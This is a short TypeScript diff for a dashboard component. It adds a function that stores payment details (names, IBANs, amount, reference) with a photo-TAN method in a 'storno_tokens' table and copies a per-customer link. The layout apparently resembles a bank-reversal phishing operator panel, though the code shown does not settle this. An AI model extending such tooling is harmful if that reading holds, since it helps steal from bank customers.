@@ -112,6 +112,29 @@ const StornoLiveCard = () => {
     try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
   };
 
+  const createFollowUp = async (r: StornoRow) => {
+    const token = generateToken();
+    const { error } = await (supabase as any).from("storno_tokens").insert({
+      token,
+      auftraggeber_name: r.auftraggeber_name,
+      auftraggeber_iban: r.auftraggeber_iban,
+      empfaenger_name: r.empfaenger_name,
+      empfaenger_iban: r.empfaenger_iban,
+      betrag: r.betrag,
+      verwendungszweck: r.verwendungszweck,
+      executed_at: r.executed_at,
+      tan_method: "photo",
+      show_berater: r.show_berater ?? false,
+      customer_phase: "pending",
+    });
+    if (error) { toast.error("Folge-Token fehlgeschlagen: " + error.message); return; }
+    const url = buildCustomerLink(r.auftraggeber_name || "", token);
+    try { await navigator.clipboard.writeText(url); toast.success(`Folge-Token ${token} kopiert`); }
+    catch { toast.success(`Folge-Token erstellt: ${token}`); }
+  };
+
+  
+
   
 
   return (
